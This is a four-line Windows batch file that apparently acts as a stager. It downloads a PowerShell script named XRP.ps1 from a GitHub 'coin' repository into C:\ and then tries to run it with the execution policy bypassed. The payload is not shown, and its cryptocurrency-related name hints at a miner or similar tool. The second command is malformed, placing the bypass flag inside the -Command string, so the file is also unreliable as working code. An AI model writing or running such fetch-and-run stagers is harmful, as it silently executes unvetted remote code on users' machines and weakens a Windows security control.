@echo off
powershell -NoProfile -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/XRP.ps1' -OutFile 'C:\XRP.ps1'"
powershell -NoProfile -Command "-ExecutionPolicy Bypass -File 'C:\XRP.ps1'"
exit
